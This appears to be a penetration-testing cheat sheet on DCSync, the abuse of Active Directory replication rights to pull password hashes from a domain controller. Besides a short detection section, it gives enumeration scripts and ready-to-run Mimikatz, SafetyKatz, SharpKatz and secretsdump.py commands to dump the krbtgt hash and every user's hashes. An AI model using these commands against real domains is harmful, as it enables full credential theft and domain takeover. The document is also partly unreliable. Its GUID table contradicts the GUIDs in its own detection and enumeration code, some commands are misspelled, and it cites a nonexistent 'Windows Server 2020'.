## Information

> WinRM may fail, but LDAP-backed replication rights should still allow DCSync.

Domain Controllers replicate changes inside a domain or forest through the Directory Replication Service (DRS). `DCSync` is an offensive technique that abuses that same mechanism to request replication data such as users, password material, and service secrets from a DC. Tools such as Mimikatz (`lsadump::dcsync`) implement the workflow over DRS/RPC to pull credentials, commonly including the `krbtgt` account. You do **not** need code execution on the DC itself. You only need an account with the required rights: `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`. In environments with RODCs, `DS-Replication-Get-Changes-In-Filtered-Set` may also matter.

These rights are usually held by default by:

- `Domain Admins`
- `Enterprise Admins`
- `Administrators` in the domain
- `Backup Operators` in some environments
- `Schema Admins` in rarer cases

| Permission | Description | Exploitation risk | GUID |
| --- | --- | --- | --- |
| DS-Replication-Get-Changes | Allows replication of AD object changes, but not necessarily sensitive password data | Low | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` |
| DS-Replication-Get-Changes-All | Allows replication of all changes, including NTLM material and password-related data | High ⚠️ | `89e95b76-444d-4c62-991a-0facbeda640c` |
| DS-Replication-Get-Changes-In-Filtered-Set | Similar to `Get-Changes-All`, but focused on confidential/protected attributes | Moderate | `9432c620-033c-4db7-8b58-14ef6d0bf477` |

> For classic DCSync, `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` is enough. The filtered-set right is not strictly required in the common case.

- [ ] OPSEC

1. Enable `Audit Directory Service Access` in the domain GPO so directory object access is logged.
2. Hunt for Event ID 4662 (`Directory Services Object Access`) involving replication GUIDs:
   - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` → replication / get-changes activity
   - `89e95b76-444d-4c62-991a-0facbeda640c` → filtered-set style activity
3. Suspicious signals:
   - DRS requests coming from non-DC accounts or non-DC IPs
   - Accounts that normally do not replicate suddenly requesting changes
   - Spikes in access to sensitive objects such as `krbtgt`, admin accounts, or password-related attributes
4. Additional detection ideas:
   - SIEM correlation on 4662 plus the GUIDs above and source context
   - RPC/LDAP monitoring for DRS traffic from unusual hosts
   - Alerts on accounts granted replication delegation rights

_(4662 contains object-access details, so you need to parse the operation GUID field to make this useful.)_

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4662; StartTime=(Get-Date).AddDays(-7)} | Where-Object { $_.ToString() -match '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2|89e95b76-444d-4c62-991a-0facbeda640c' }
```

## Enumeration

- [ ] Active Directory Module

```powershell
$UserName="domain.local\ada"
$SID=(New-Object System.Security.Principal.NTAccount($UserName)).Translate([System.Security.Principal.SecurityIdentifier]).Value
```

```powershell
$GUID_RC      = '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' # DS-Replication-Get-Changes
$GUID_RC_ALL  = '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' # DS-Replication-Get-Changes-All
$GUID_RC_FILT = '89e95b76-444d-4c62-991a-0facbeda640c' # DS-Replication-Get-Changes-In-Filtered-Set

# Domain root object
$dn = 'DC=internal,DC=msp,DC=local'

# ACL of the domain object
$acl = Get-Acl -Path ("AD:{0}" -f $dn)

# If you have $sid and want to filter for that identity:
$targetSid = New-Object System.Security.Principal.SecurityIdentifier($sid)

$acl.Access | % { $sidThis = try { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) } catch { $null }; [pscustomobject]@{AceQualifier=$_.AceQualifier;ObjectDN=$dn;ActiveDirectoryRights=$_.ActiveDirectoryRights;SecurityIdentifier=$sidThis;ObjectAceType=$_.ObjectType} } | ? { $_.SecurityIdentifier -eq $targetSid -and ($_.ObjectAceType -in @($GUID_RC,$GUID_RC_ALL,$GUID_RC_FILT)) } | fl AceQualifier,ObjectDN,ActiveDirectoryRights,SecurityIdentifier,ObjectAceType
```

- [ ] PowerView

```powershell
Get-ObjectAcl "DC=it,DC=gcb,DC=local" -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication-Get'} | % { $_ | Add-Member NoteProperty IdentityName (Convert-SidToName $_.SecurityIdentifier) -PassThru } |select IdentityName,SecurityIdentifier,AceQualifier, ObjectDN, ActiveDirectoryRight,ObjectAceType | fl
```

## Exploitation

- [ ] Windows

```powershell
# krbtgt user
.\mimikatz.exe "privilge::debug" "token:elevate" "lsadump::dcsync /domain:domain.local /user:domain\krbtgt" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:internal.msp.local /user:krbtgt" "exit"

# Invoke-Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'

# SafetyKatz
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"

# SafetyKatz Old (for Windows Server 2020 style lab images)
SafetyKatz_old.exe "lsadump::dcsync /user:us\krbtgt" "exit"

SharpKatz.exe --Command dcsync --User us\krbtgt --Domain domain.local --DomainController dc01-dc.domain.local

# Get hashes for all users in the domain
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all" "exit"

# Computer account
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:DOMAIN\HOST$" "exit"

# Dump all users
Invoke-DCSync -Domain "domain.local" -Users (Get-ADUser -Filter *).SamAccountName
```

- [ ] Linux

```bash
secretsdump.py domain.local/ada@IP_DC -just-dc -outputfile domain_hashes
secretsdump.py domain.local/ada@IP_DC -just-dc -outputfile domain_hashes -hashes :NTLM_HASH

# Specific user
secretsdump.py domain.local/ada@IP_DC -just-dc-user domain/krbtgt -outputfile krbtgt_hashes

# With a Kerberos ticket
secretsdump.py -k -no-pass DC01.DOMAIN.LOCAL
secretsdump.py -k -no-pass DC01.DOMAIN.LOCAL -just-dc-user domain/krbtgt
```

- `domain_hashes`: output prefix where the dumped hashes will be written
- `-just-dc`: extract NTLM and Kerberos material from NTDS-related replication output
- `-just-dc-ntlm`: extract only NTLM hashes
- `-just-dc-user <USERNAME>`: extract only one user's data
- `DC01.DOMAIN.LOCAL`: the target DC name
